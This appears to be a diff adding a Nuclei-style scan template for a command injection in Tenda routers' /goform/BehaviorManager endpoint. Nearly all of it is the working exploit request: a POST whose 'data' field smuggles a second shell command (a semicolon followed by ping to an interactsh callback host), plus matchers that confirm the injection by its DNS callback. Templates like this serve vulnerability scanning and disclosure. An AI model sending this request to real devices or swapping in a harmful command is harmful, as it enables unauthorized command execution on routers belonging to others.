@@ -1,0 +1,24 @@
+id: tenda-router-behaviormanager-command-injection
+info:
+  name: 腾达路由器 BehaviorManager 模块命令注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+  tags: 腾达路由器
+http:
+- raw:
+  - |
+    POST /goform/BehaviorManager HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    modulename=macfilter&option=add&switch=0&data=%3Bping+{{interactsh-url}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
